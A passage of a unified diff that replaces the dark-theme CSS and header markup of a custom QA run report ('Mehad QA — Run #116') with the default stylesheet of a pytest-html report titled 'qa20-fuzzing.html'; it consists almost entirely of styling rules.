@@ -1,861 +1,1094 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>Mehad QA — Run #116 · 2026-06-18 09:50:58</title>
-<link rel="preconnect" href="https://fonts.googleapis.com"/>
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet"/>
-<style>
-/* ── Design tokens ── */
-:root{
-  --bg-0:#07080b;
-  --bg-1:#0c0e13;
-  --bg-2:#11141b;
-  --bg-3:#181c26;
-  --ink-0:#f6f7fa;
-  --ink-1:#cdd1de;
-  --ink-2:#9aa0b4;
-  --ink-3:#626880;
-  --ink-4:#3a4154;
-  --accent:oklch(0.85 0.18 95);
-  --ok:oklch(0.78 0.16 155);
-  --bad:oklch(0.72 0.20 25);
-  --warn:oklch(0.82 0.14 70);
-  --accent-dim:oklch(0.85 0.18 95 / 0.15);
-  --ok-dim:oklch(0.78 0.16 155 / 0.15);
-  --bad-dim:oklch(0.72 0.20 25 / 0.15);
-  --warn-dim:oklch(0.82 0.14 70 / 0.15);
-  --radius:10px;
-  --font:'Inter',system-ui,sans-serif;
-  --mono:'JetBrains Mono',monospace;
-  --serif:'Instrument Serif',Georgia,serif;
+<html>
+  <head>
+    <meta charset="utf-8"/>
+    <title id="head-title">qa20-fuzzing.html</title>
+      <style type="text/css">body {
+  font-family: Helvetica, Arial, sans-serif;
+  font-size: 12px;
+  /* do not increase min-width as some may use split screens */
+  min-width: 800px;
+  color: #999;
 }
 
-/* ── Reset ── */
-*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-html{scroll-behavior:smooth}
-body{background:var(--bg-0);color:var(--ink-1);font-family:var(--font);font-size:14px;line-height:1.6}
-a{color:var(--accent);text-decoration:none}
-a:hover{text-decoration:underline}
-code,pre{font-family:var(--mono);font-size:12px}
-pre{background:var(--bg-1);border:1px solid var(--ink-4);border-radius:6px;
-     padding:12px;overflow-x:auto;white-space:pre-wrap;word-break:break-word;color:var(--ink-1)}
-
-/* ── Nav ── */
-.nav{
-  position:sticky;top:0;z-index:100;
-  background:rgba(7,8,11,0.85);
-  backdrop-filter:blur(12px);
-  border-bottom:1px solid var(--ink-4);
-  padding:0 24px;
-  display:flex;align-items:center;gap:16px;height:52px;
-}
-.mark{
-  width:28px;height:28px;border-radius:7px;flex-shrink:0;
-  background:conic-gradient(from 135deg,oklch(0.85 0.18 95),oklch(0.78 0.16 155),oklch(0.72 0.20 25),oklch(0.85 0.18 95));
-  display:flex;align-items:center;justify-content:center;
-  font-weight:700;font-size:13px;color:#07080b;font-family:var(--mono);
-}
-.crumbs{font-size:13px;color:var(--ink-3);display:flex;align-items:center;gap:6px;flex:1}
-.crumbs a{color:var(--ink-2);}
-.crumbs a:hover{color:var(--ink-0)}
-.crumbs .sep{color:var(--ink-4)}
-.crumbs .current{color:var(--ink-0);font-weight:600}
-.btn{
-  border:1px solid var(--ink-4);background:var(--bg-2);color:var(--ink-1);
-  padding:6px 14px;border-radius:7px;cursor:pointer;font-size:12px;font-weight:500;
-  font-family:var(--font);transition:background .15s,border-color .15s;
-}
-.btn:hover{background:var(--bg-3);border-color:var(--ink-2)}
-.btn.primary{background:var(--accent);color:#07080b;border-color:var(--accent);font-weight:700}
-.btn.primary:hover{opacity:.9}
-
-/* ── Page wrap ── */
-.wrap{max-width:1200px;margin:0 auto;padding:28px 24px}
-
-/* ── Commit / run header section ── */
-.commit{
-  background:linear-gradient(160deg,var(--bg-2) 0%,var(--bg-1) 100%);
-  border:1px solid var(--ink-4);border-radius:14px;
-  padding:28px 32px;margin-bottom:24px;
-}
-.badge-row{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:16px}
-.pill{
-  display:inline-flex;align-items:center;gap:6px;
-  border-radius:99px;padding:4px 12px;font-size:12px;font-weight:600;
-  border:1px solid var(--ink-4);background:var(--bg-3);color:var(--ink-2);
-}
-.pill.run{background:var(--accent-dim);border-color:var(--accent);color:var(--accent)}
-.pill.ok{background:var(--ok-dim);border-color:var(--ok);color:var(--ok)}
-.pill.fail{background:var(--bad-dim);border-color:var(--bad);color:var(--bad)}
-.commit h1{
-  font-size:clamp(20px,3vw,28px);font-weight:700;color:var(--ink-0);
-  letter-spacing:-0.5px;margin-bottom:10px;
-}
-.commit h1 em{font-family:var(--serif);font-style:italic;color:var(--accent)}
-.commit-meta{font-size:13px;color:var(--ink-2);display:flex;gap:20px;flex-wrap:wrap;margin-bottom:12px}
-.commit-meta b{color:var(--ink-1)}
-.stamp{
-  display:inline-flex;align-items:center;gap:8px;
-  font-size:12px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;
-  padding:5px 14px;border-radius:99px;
-  border:1px solid var(--bad);color:var(--bad);background:var(--bad-dim);
-}
-.stamp.pass-stamp{border-color:var(--ok);color:var(--ok);background:var(--ok-dim)}
-
-/* ── Card ── */
-.card{
-  background:var(--bg-1);border:1px solid var(--ink-4);
-  border-radius:12px;margin-bottom:20px;overflow:hidden;
-}
-.card-head{
-  padding:14px 20px;border-bottom:1px solid var(--ink-4);
-  display:flex;align-items:center;justify-content:space-between;
-}
-.card-head h4{font-size:13px;font-weight:700;color:var(--ink-0);letter-spacing:.3px;text-transform:uppercase}
-.card-body{padding:20px}
-
-/* ── Quality diff strip ── */
-.diff-rows{display:flex;flex-direction:column;gap:2px}
-.diff-row{
-  display:grid;grid-template-columns:20px 1fr auto;
-  gap:10px;align-items:center;padding:10px 16px;
-  border-radius:6px;font-size:13px;
-}
-.diff-row .sym{font-weight:700;font-family:var(--mono);font-size:13px}
-.diff-row .lbl{color:var(--ink-1)}
-.diff-row .val{font-weight:700;font-family:var(--mono);font-size:14px}
-.diff-row.add{background:var(--bad-dim)}
-.diff-row.add .sym{color:var(--bad)}
-.diff-row.add .val{color:var(--bad)}
-.diff-row.up{background:var(--ok-dim)}
-.diff-row.up .sym{color:var(--ok)}
-.diff-row.up .val{color:var(--ok)}
-.diff-row.neutral{background:var(--bg-2)}
-.diff-row.neutral .sym{color:var(--ink-3)}
-.diff-row.neutral .val{color:var(--ink-2)}
-
-/* ── Two-column layout ── */
-.layout{display:grid;grid-template-columns:1fr 340px;gap:20px;align-items:start}
-
-/* ── Trace (spec waterfall) ── */
-.trace-axis{padding:14px 20px 6px;display:flex;justify-content:space-between;
-            font-size:10px;color:var(--ink-4);text-transform:uppercase;letter-spacing:.5px}
-.trace-row{
-  display:grid;grid-template-columns:180px 1fr;
-  gap:12px;align-items:center;padding:6px 16px;
-}
-.trace-row:hover{background:var(--bg-2)}
-.trace-row .nm{font-size:12px;color:var(--ink-2);font-family:var(--mono);
-               white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.trace-row .lane{height:22px;background:var(--bg-3);border-radius:4px;overflow:hidden;position:relative}
-.trace-bar{
-  height:100%;border-radius:4px;display:flex;align-items:center;
-  padding:0 8px;font-size:10px;font-weight:700;color:#07080b;
-  white-space:nowrap;overflow:hidden;min-width:4%;
-  transition:width .4s ease;
-}
-.trace-bar.pass{background:var(--ok)}
-.trace-bar.fail{background:var(--bad)}
-
-/* ── Tests section ── */
-.section h5{
-  font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;
-  color:var(--ink-3);padding:14px 20px 10px;border-bottom:1px solid var(--ink-4);
-}
-.tests-tools{
-  padding:12px 16px;display:flex;gap:8px;align-items:center;flex-wrap:wrap;
-  border-bottom:1px solid var(--ink-4);background:var(--bg-2);
-}
-.chip{
-  padding:5px 12px;border-radius:99px;font-size:12px;font-weight:600;cursor:pointer;
-  border:1px solid var(--ink-4);color:var(--ink-2);background:var(--bg-3);
-  transition:all .15s;user-select:none;
-}
-.chip:hover{border-color:var(--ink-2);color:var(--ink-1)}
-.chip.active{background:var(--bg-3);border-color:var(--ink-1);color:var(--ink-0)}
-.chip.fail.active{background:var(--bad-dim);border-color:var(--bad);color:var(--bad)}
-.chip.pass.active{background:var(--ok-dim);border-color:var(--ok);color:var(--ok)}
-#testSearch{
-  flex:1;min-width:160px;background:var(--bg-1);border:1px solid var(--ink-4);
-  border-radius:99px;padding:5px 14px;font-size:12px;color:var(--ink-1);
-  font-family:var(--font);outline:none;transition:border-color .15s;
-}
-#testSearch:focus{border-color:var(--accent)}
-#testSearch::placeholder{color:var(--ink-4)}
-
-/* ── Group (spec accordion) ── */
-.group{border-bottom:1px solid var(--ink-4)}
-.group:last-child{border-bottom:none}
-.group-head{
-  display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;
-  user-select:none;transition:background .12s;
-}
-.group-head:hover{background:var(--bg-2)}
-.group-head .chev{font-size:10px;color:var(--ink-3);transition:transform .2s;width:12px;flex-shrink:0}
-.group.open .group-head .chev{transform:rotate(90deg)}
-.group-head .gtag{font-size:13px;font-weight:600;color:var(--ink-0);font-family:var(--mono);flex:1}
-.group-head .count{font-size:11px;color:var(--ink-3);white-space:nowrap}
-.group-body{display:none;background:var(--bg-0)}
-.group.open .group-body{display:block}
-
-/* ── Individual test row ── */
-.test{border-bottom:1px solid var(--ink-4)}
-.test:last-child{border-bottom:none}
-.test-row{
-  display:flex;align-items:center;gap:10px;padding:9px 28px;cursor:pointer;
-  transition:background .12s;font-size:13px;
-}
-.test:not(.open) .test-row:hover{background:var(--bg-2)}
-.test.open .test-row{background:var(--bg-2)}
-.test-row .chev{font-size:9px;color:var(--ink-4);transition:transform .2s;width:10px;flex-shrink:0}
-.test.open .test-row .chev{transform:rotate(90deg)}
-.statdot{
-  width:18px;height:18px;border-radius:50%;flex-shrink:0;
-  display:flex;align-items:center;justify-content:center;
-  font-size:9px;font-weight:800;
-}
-.statdot.pass{background:var(--ok-dim);color:var(--ok);border:1px solid var(--ok)}
-.statdot.fail{background:var(--bad-dim);color:var(--bad);border:1px solid var(--bad)}
-.name-cell{flex:1;min-width:0;overflow:hidden}
-.tname{font-family:var(--mono);font-size:12px;color:var(--ink-1);
-        white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.tag{font-size:10px;font-weight:700;padding:2px 7px;border-radius:4px;flex-shrink:0}
-.tag.p0{background:var(--bad-dim);color:var(--bad);border:1px solid var(--bad)}
-.tag.p1{background:var(--warn-dim);color:var(--warn);border:1px solid var(--warn)}
-.tag.p2{background:var(--ok-dim);color:var(--ok);border:1px solid var(--ok)}
-.tag.p3{background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent)}
-
-/* ── Test expanded body ── */
-.test-body{display:none;padding:14px 28px 18px 56px;background:var(--bg-0);border-top:1px solid var(--ink-4)}
-.test.open .test-body{display:block}
-.pass-body{display:none;padding:14px 28px 18px 56px;background:var(--bg-0);border-top:1px solid var(--ink-4)}
-.test.open .pass-body{display:block}
-.pass-fields{display:flex;flex-direction:column;gap:6px}
-.pass-fields dt{font-size:11px;text-transform:uppercase;letter-spacing:.5px;color:var(--ink-3);font-weight:600;margin-top:6px}
-.pass-fields dd{font-size:13px;color:var(--ink-1);font-family:var(--mono);padding-left:12px}
-
-/* ── Meta grid (inside test body) ── */
-.meta-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
-.meta-cell{background:var(--bg-2);border-radius:7px;padding:10px 12px}
-.meta-cell .k{font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:var(--ink-3);font-weight:600;margin-bottom:3px}
-.meta-cell .v{font-size:13px;color:var(--ink-1);font-family:var(--mono)}
-
-/* ── Er grid (expected/actual) ── */
-.er-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:12px 0}
-.er-card{border-radius:8px;padding:12px 14px;border:1px solid}
-.er-card.ok{background:var(--ok-dim);border-color:var(--ok)}
-.er-card.ok .k{color:var(--ok)}
-.er-card.bad{background:var(--bad-dim);border-color:var(--bad)}
-.er-card.bad .k{color:var(--bad)}
-.er-card .k{font-size:10px;text-transform:uppercase;letter-spacing:.5px;font-weight:700;margin-bottom:4px}
-.er-card .v{font-size:12px;color:var(--ink-1)}
-
-/* ── Code box ── */
-.codebox{
-  background:var(--bg-2);border:1px solid var(--ink-4);border-radius:7px;
-  padding:12px;font-family:var(--mono);font-size:11px;color:var(--ink-2);
-  overflow-x:auto;white-space:pre-wrap;word-break:break-word;margin-top:8px;
+h1 {
+  font-size: 24px;
+  color: black;
 }
 
-/* ── Traceback toggle ── */
-.trace-toggle{
-  width:100%;background:var(--bg-1);border:1px solid var(--ink-4);
-  border-radius:6px;padding:8px 14px;color:var(--bad);font-family:var(--mono);
-  font-size:11px;cursor:pointer;text-align:left;display:flex;
-  justify-content:space-between;align-items:center;margin-top:12px;
-  font-family:var(--font);
+h2 {
+  font-size: 16px;
+  color: black;
 }
-.trace-toggle:hover{background:var(--bg-2)}
-.trace-toggle .arr{color:var(--ink-3);font-size:10px}
 
-/* ── Sidebar ── */
-.side{position:sticky;top:70px}
-.side-head{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--ink-3);margin-bottom:10px}
-.ringwrap{display:flex;align-items:center;justify-content:center;padding:20px 16px}
-.ring{width:120px;height:120px}
-
-/* ── Mini-stats row ── */
-.mini-stats{display:grid;grid-template-columns:1fr 1fr;gap:8px;padding:0 16px 16px}
-.ms{background:var(--bg-2);border-radius:8px;padding:10px 12px;border:1px solid var(--ink-4)}
-.ms .ms-v{font-size:22px;font-weight:700;font-family:var(--mono);line-height:1}
-.ms .ms-l{font-size:10px;color:var(--ink-3);text-transform:uppercase;letter-spacing:.5px;margin-top:3px}
-.ms.bad .ms-v{color:var(--bad)}
-.ms.warn .ms-v{color:var(--warn)}
-.ms.ok .ms-v{color:var(--ok)}
-
-/* ── Run metadata DL ── */
-.run-dl{padding:14px 18px;display:flex;flex-direction:column;gap:0}
-.run-dl dt{font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:var(--ink-3);
-           font-weight:600;margin-top:10px}
-.run-dl dt:first-child{margin-top:0}
-.run-dl dd{font-size:13px;color:var(--ink-1);font-family:var(--mono)}
-
-/* ── Bug cards ── */
-.bug-card{
-  background:var(--bg-1);border:1px solid var(--ink-4);
-  border-radius:12px;margin-bottom:20px;overflow:hidden;
+p {
+  color: black;
 }
-.bug-card-hdr{
-  padding:16px 20px;display:flex;align-items:flex-start;
-  justify-content:space-between;flex-wrap:wrap;gap:8px;
-  border-bottom:1px solid var(--ink-4);background:var(--bg-2);
+
+a {
+  color: #999;
 }
-.bug-card-hdr .left{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
-.bug-id{
-  font-size:11px;font-weight:700;color:var(--ink-3);
-  font-family:var(--mono);background:var(--bg-0);
-  border:1px solid var(--ink-4);padding:2px 8px;border-radius:4px;
+
+table {
+  border-collapse: collapse;
 }
-.bug-title{font-size:15px;font-weight:600;color:var(--ink-0);margin-top:4px}
-.bug-meta{font-size:12px;color:var(--ink-3);display:flex;gap:16px;flex-wrap:wrap;margin-top:6px}
-.bug-meta span{display:flex;align-items:center;gap:4px}
-.bug-body{padding:20px}
 
-/* ── Badge / severity ── */
-.badge{
-  display:inline-block;padding:3px 10px;border-radius:99px;font-size:11px;
-  font-weight:700;letter-spacing:.4px;text-transform:uppercase;
+/******************************
+ * SUMMARY INFORMATION
+ ******************************/
+#environment td {
+  padding: 5px;
+  border: 1px solid #e6e6e6;
+  vertical-align: top;
 }
-.badge.CRITICAL{background:var(--bad-dim);color:var(--bad);border:1px solid var(--bad)}
-.badge.HIGH{background:var(--warn-dim);color:var(--warn);border:1px solid var(--warn)}
-.badge.MEDIUM{background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent)}
-.badge.LOW{background:var(--ok-dim);color:var(--ok);border:1px solid var(--ok)}
-.badge.PASS{background:var(--ok-dim);color:var(--ok);border:1px solid var(--ok)}
-.badge.FAIL{background:var(--bad-dim);color:var(--bad);border:1px solid var(--bad)}
-.badge.gen-fail{background:var(--warn-dim);color:var(--warn);border:1px solid var(--warn)}
-.badge.P0{background:var(--bad-dim);color:var(--bad);border:1px solid var(--bad)}
-.badge.P1{background:var(--warn-dim);color:var(--warn);border:1px solid var(--warn)}
-.badge.P2{background:var(--ok-dim);color:var(--ok);border:1px solid var(--ok)}
-.badge.P3{background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent)}
-
-/* ── Info blocks ── */
-.info-block{border-radius:8px;padding:14px 16px;margin-bottom:12px}
-.info-block .ib-label{font-size:11px;font-weight:700;text-transform:uppercase;
-                       letter-spacing:.6px;margin-bottom:8px}
-.info-block.expected{background:var(--ok-dim);border-left:3px solid var(--ok)}
-.info-block.expected .ib-label{color:var(--ok)}
-.info-block.actual{background:var(--bad-dim);border-left:3px solid var(--bad)}
-.info-block.actual .ib-label{color:var(--bad)}
-.info-block.analysis{background:var(--bg-3);border-left:3px solid var(--accent)}
-.info-block.analysis .ib-label{color:var(--accent)}
-.info-block.fix{background:var(--ok-dim);border-left:3px solid var(--ok)}
-.info-block.fix .ib-label{color:var(--ok)}
-.info-block.rootcause{background:var(--warn-dim);border-left:3px solid var(--warn)}
-.info-block.rootcause .ib-label{color:var(--warn)}
-.info-block.priority{background:var(--bg-3);border-left:3px solid var(--accent)}
-.info-block.priority .ib-label{color:var(--accent)}
-
-/* ── Two-col for info blocks ── */
-.two-col{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px}
-@media(max-width:640px){.two-col{grid-template-columns:1fr}}
-
-/* ── Steps ── */
-ol.steps{padding-left:20px;color:var(--ink-1)}
-ol.steps li{margin-bottom:5px}
-
-/* ── Screenshot ── */
-.shot-wrap{margin-top:16px}
-.shot-label{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.6px;
-            color:var(--ink-3);margin-bottom:8px;display:flex;align-items:center;gap:6px}
-.screenshot{width:100%;border:1px solid var(--ink-4);border-radius:8px;cursor:zoom-in;transition:opacity .2s}
-.screenshot:hover{opacity:.9}
-.no-shot{background:var(--bg-2);border:1px dashed var(--ink-4);border-radius:8px;
-         padding:20px;text-align:center;color:var(--ink-3);font-size:12px}
-
-/* ── Video ── */
-.video-wrap{margin-top:16px}
-.video-label{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.6px;
-             color:var(--ink-3);margin-bottom:8px;display:flex;align-items:center;gap:6px}
-.poc-video{width:100%;max-height:540px;border:1px solid var(--ink-4);border-radius:8px;background:#000}
-
-/* ── Error toggle ── */
-.err-toggle{
-  width:100%;background:var(--bg-2);border:1px solid var(--ink-4);
-  border-radius:6px;padding:10px 14px;color:var(--bad);font-size:12px;
-  cursor:pointer;text-align:left;display:flex;justify-content:space-between;
-  align-items:center;margin-top:14px;font-family:var(--font);
+#environment tr:nth-child(odd) {
+  background-color: #f6f6f6;
 }
-.err-toggle:hover{background:var(--bg-3)}
-.err-body{display:none;margin-top:1px}
-.err-body.open{display:block}
-
-/* ── Evidence panels ── */
-.ev-toggle{
-  width:100%;background:var(--bg-2);border:1px solid var(--ink-4);border-radius:6px;
-  padding:9px 14px;color:var(--accent);font-size:12px;cursor:pointer;
-  text-align:left;display:flex;justify-content:space-between;align-items:center;
-  margin-top:10px;font-family:var(--font);
+#environment ul {
+  margin: 0;
+  padding: 0 20px;
 }
-.ev-toggle:hover{background:var(--bg-3)}
-.ev-body{display:none;margin-top:1px}
-.ev-body.open{display:block}
-.ev-table{width:100%;border-collapse:collapse;font-size:11px;margin-top:4px}
-.ev-table th{background:var(--bg-0);color:var(--ink-3);padding:5px 10px;text-align:left;font-weight:600;border:1px solid var(--ink-4)}
-.ev-table td{padding:4px 10px;border:1px solid var(--ink-4);color:var(--ink-1);word-break:break-all;max-width:400px}
-.perf-grid{display:flex;gap:16px;flex-wrap:wrap;margin-top:4px}
-.perf-stat{background:var(--bg-2);border:1px solid var(--ink-4);border-radius:6px;padding:10px 16px;min-width:120px;text-align:center}
-.perf-stat .pval{font-size:22px;font-weight:700;color:var(--accent)}
-.perf-stat .plbl{font-size:10px;color:var(--ink-3);text-transform:uppercase;letter-spacing:.5px;margin-top:4px}
-.pval.warn{color:var(--warn)}
-.pval.bad{color:var(--bad)}
 
-/* ── Console ── */
-.console-err{background:var(--bad-dim);border-left:3px solid var(--bad);padding:6px 10px;border-radius:4px;margin-bottom:4px;font-size:11px;font-family:var(--mono);color:var(--bad)}
-.console-warn{background:var(--warn-dim);border-left:3px solid var(--warn);padding:6px 10px;border-radius:4px;margin-bottom:4px;font-size:11px;font-family:var(--mono);color:var(--warn)}
-
-/* ── Env strip ── */
-.env-strip{font-size:11px;color:var(--ink-3);display:flex;gap:16px;flex-wrap:wrap;
-           margin-top:14px;padding-top:14px;border-top:1px solid var(--ink-4)}
-.env-strip b{color:var(--ink-1)}
-
-/* ── Board/SLA chips ── */
-.board-chip{font-size:10px;font-weight:700;letter-spacing:.4px;padding:2px 8px;
-           border-radius:4px;text-transform:uppercase;display:inline-block}
-.board-chip.expedite{background:var(--bad-dim);color:var(--bad);border:1px solid var(--bad)}
-.board-chip.else{background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent)}
-.biz-badge{font-size:10px;font-weight:700;letter-spacing:.4px;padding:2px 8px;
-          border-radius:4px;background:var(--warn-dim);color:var(--warn);
-          border:1px solid var(--warn);display:inline-block;animation:biz-pulse 2s ease-in-out infinite}
-@keyframes biz-pulse{0%,100%{opacity:1} 50%{opacity:.7}}
-.sla-chip{font-size:10px;color:var(--ink-3);background:var(--bg-2);
-         border:1px solid var(--ink-4);border-radius:4px;padding:2px 8px;display:inline-block}
-
-/* ── Cluster summary ── */
-.cluster-summary{margin:0 0 20px}
-.cluster-headline{font-size:14px;color:var(--ink-2);margin-bottom:14px}
-.cluster-headline strong{color:var(--accent)}
-.cluster-list{display:flex;flex-direction:column;gap:8px}
-.cluster-row{background:var(--bg-2);border:1px solid var(--ink-4);border-radius:8px;
-             padding:14px 18px;display:grid;grid-template-columns:auto 1fr auto;
-             gap:14px;align-items:center}
-.cluster-row:hover{border-color:var(--accent)}
-.cluster-meta{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
-.cluster-count{font-size:11px;color:var(--ink-3);background:var(--bg-0);
-               border:1px solid var(--ink-4);border-radius:4px;padding:3px 8px;font-weight:600}
-.cluster-title{font-size:13px;color:var(--ink-0);font-weight:600}
-.cluster-tickets{display:flex;gap:6px;flex-wrap:wrap;justify-content:flex-end;max-width:300px}
-.cluster-bug-link{font-size:10px;font-family:var(--mono);color:var(--accent);
-                  text-decoration:none;background:var(--bg-0);border:1px solid var(--ink-4);
-                  padding:2px 6px;border-radius:4px}
-.cluster-bug-link:hover{border-color:var(--accent);background:var(--accent-dim)}
-.recurrence-badge{background:var(--bad-dim);color:var(--bad);border:1px solid var(--bad);
-                  border-radius:4px;padding:2px 8px;font-size:10px;
-                  font-weight:700;text-transform:uppercase;letter-spacing:.4px}
-.cluster-help{font-size:11px;color:var(--ink-3);margin-top:12px;
-              padding:8px 12px;background:var(--bg-2);border-radius:6px;
-              border-left:3px solid var(--accent)}
-
-/* ── Gap block ── */
-.gap-block{background:var(--bg-2);border:1px solid var(--ink-4);
-           border-radius:var(--radius);padding:20px;margin-bottom:16px}
-.gap-block h3{color:var(--accent);font-size:14px;margin-bottom:12px}
-.gap-block p,.gap-block li{color:var(--ink-2);font-size:13px;margin-bottom:4px}
-
-/* ── Priority strip ── */
-.priority-strip{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:20px}
-.pstrip-item{background:var(--bg-2);border:1px solid var(--ink-4);border-radius:var(--radius);
-             padding:14px 16px;text-align:center;transition:transform .12s,border-color .12s}
-.pstrip-item:hover{transform:translateY(-2px)}
-.pstrip-label{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;margin-bottom:6px}
-.pstrip-val{font-size:28px;font-weight:700;line-height:1;margin-bottom:4px}
-.pstrip-sla{font-size:10px;color:var(--ink-3);margin-top:4px}
-.pstrip-item.p0{border-top:3px solid var(--bad)}
-.pstrip-item.p0 .pstrip-label,.pstrip-item.p0 .pstrip-val{color:var(--bad)}
-.pstrip-item.p1{border-top:3px solid var(--warn)}
-.pstrip-item.p1 .pstrip-label,.pstrip-item.p1 .pstrip-val{color:var(--warn)}
-.pstrip-item.p2{border-top:3px solid var(--ok)}
-.pstrip-item.p2 .pstrip-label,.pstrip-item.p2 .pstrip-val{color:var(--ok)}
-.pstrip-item.p3{border-top:3px solid var(--accent)}
-.pstrip-item.p3 .pstrip-label,.pstrip-item.p3 .pstrip-val{color:var(--accent)}
-
-/* ── Brand footer ── */
-.brand-foot{
-  margin-top:48px;padding:36px 24px;border-top:1px solid var(--ink-4);
-  display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:32px;
+/******************************
+ * TEST RESULT COLORS
+ ******************************/
+span.passed,
+.passed .col-result {
+  color: green;
 }
-.brand-foot .who{display:flex;flex-direction:column;gap:6px}
-.brand-foot .who .logo-row{display:flex;align-items:center;gap:10px;margin-bottom:4px}
-.brand-foot .who .bname{font-weight:700;font-size:15px;color:var(--ink-0)}
-.brand-foot .who .btitle{font-size:12px;color:var(--ink-3)}
-.brand-foot .links{display:flex;flex-direction:column;gap:8px}
-.brand-foot .links a{font-size:13px;color:var(--ink-2)}
-.brand-foot .links a:hover{color:var(--ink-0)}
-.brand-foot .col-head{font-size:11px;font-weight:700;text-transform:uppercase;
-                       letter-spacing:.6px;color:var(--ink-3);margin-bottom:12px}
 
-/* ── Lightbox ── */
-#lb{display:none;position:fixed;inset:0;background:rgba(0,0,0,.92);
-    z-index:1000;cursor:zoom-out;justify-content:center;align-items:center}
-#lb.show{display:flex}
-#lb img{max-width:95vw;max-height:92vh;border-radius:10px;border:1px solid var(--ink-4)}
-
-/* ── Section heading h5 in cards ── */
-.sec-title{font-size:15px;font-weight:700;color:var(--ink-0);
-           border-bottom:1px solid var(--ink-4);padding-bottom:12px;margin:0 0 18px}
-.sec-title .count{background:var(--bg-3);color:var(--ink-3);font-size:11px;
-                  padding:2px 8px;border-radius:99px;margin-left:8px;font-weight:400}
-
-/* ── Responsive breakpoints ── */
-@media(max-width:1100px){
-  .layout{grid-template-columns:1fr}
-  .side{position:static}
-  .brand-foot{grid-template-columns:1fr 1fr}
+span.skipped,
+span.xfailed,
+span.rerun,
+.skipped .col-result,
+.xfailed .col-result,
+.rerun .col-result {
+  color: orange;
 }
-@media(max-width:880px){
-  .commit{padding:20px}
-  .trace-row{grid-template-columns:120px 1fr}
-  .priority-strip{grid-template-columns:repeat(2,1fr)}
+
+span.error,
+span.failed,
+span.xpassed,
+.error .col-result,
+.failed .col-result,
+.xpassed .col-result {
+  color: red;
 }
-@media(max-width:680px){
-  .wrap{padding:16px 12px}
-  .brand-foot{grid-template-columns:1fr}
-  .commit h1{font-size:20px}
-  .commit-meta{gap:10px}
-  .meta-grid{grid-template-columns:1fr}
-  .er-grid{grid-template-columns:1fr}
-  .two-col{grid-template-columns:1fr}
-  .mini-stats{grid-template-columns:1fr 1fr}
-  .cluster-row{grid-template-columns:1fr;gap:8px}
-  .cluster-tickets{justify-content:flex-start;max-width:100%}
-  .priority-strip{grid-template-columns:1fr 1fr}
-  .perf-grid{flex-wrap:wrap}
+
+.col-links__extra {
+  margin-right: 3px;
 }
-@media print{
-  .nav{display:none}
-  body{background:#fff;color:#000}
-  .bug-card,.card{border:1px solid #ccc;break-inside:avoid}
+
+/******************************
+ * RESULTS TABLE
+ *
+ * 1. Table Layout
+ * 2. Extra
+ * 3. Sorting items
+ *
+ ******************************/
+/*------------------
+ * 1. Table Layout
+ *------------------*/
+#results-table {
+  border: 1px solid #e6e6e6;
+  color: #999;
+  font-size: 12px;
+  width: 100%;
 }
-</style>
-</head>
-<body>
+#results-table th,
+#results-table td {
+  padding: 5px;
+  border: 1px solid #e6e6e6;
+  text-align: left;
+}
+#results-table th {
+  font-weight: bold;
+}
 
-<!-- Nav -->
-<nav class="nav">
-  <div class="mark">M</div>
-  <div class="crumbs">
-    <a href="index.html">Mehad QA</a>
-    <span class="sep">/</span>
-    <span class="current">Run #116</span>
-  </div>
-  <button class="btn primary" onclick="window.print()">Export PDF</button>
-</nav>
+/*------------------
+ * 2. Extra
+ *------------------*/
+.logwrapper {
+  max-height: 230px;
+  overflow-y: scroll;
+  background-color: #e6e6e6;
+}
+.logwrapper.expanded {
+  max-height: none;
+}
+.logwrapper.expanded .logexpander:after {
+  content: "collapse [-]";
+}
+.logwrapper .logexpander {
+  z-index: 1;
+  position: sticky;
+  top: 10px;
+  width: max-content;
+  border: 1px solid;
+  border-radius: 3px;
+  padding: 5px 7px;
+  margin: 10px 0 10px calc(100% - 80px);
+  cursor: pointer;
+  background-color: #e6e6e6;
+}
+.logwrapper .logexpander:after {
+  content: "expand [+]";
+}
+.logwrapper .logexpander:hover {
+  color: #000;
+  border-color: #000;
+}
+.logwrapper .log {
+  min-height: 40px;
+  position: relative;
+  top: -50px;
+  height: calc(100% + 50px);
+  border: 1px solid #e6e6e6;
+  color: black;
+  display: block;
+  font-family: "Courier New", Courier, monospace;
+  padding: 5px;
+  padding-right: 80px;
+  white-space: pre-wrap;
+}
 
-<!-- Lightbox -->
-<div id="lb" onclick="this.classList.remove('show')">
-  <img id="lb-img" src="" alt="Screenshot"/>
-</div>
+div.media {
+  border: 1px solid #e6e6e6;
+  float: right;
+  height: 240px;
+  margin: 0 5px;
+  overflow: hidden;
+  width: 320px;
+}
 
-<div class="wrap">
+.media-container {
+  display: grid;
+  grid-template-columns: 25px auto 25px;
+  align-items: center;
+  flex: 1 1;
+  overflow: hidden;
+  height: 200px;
+}
 
-<!-- ── Run header ── -->
-<section class="commit">
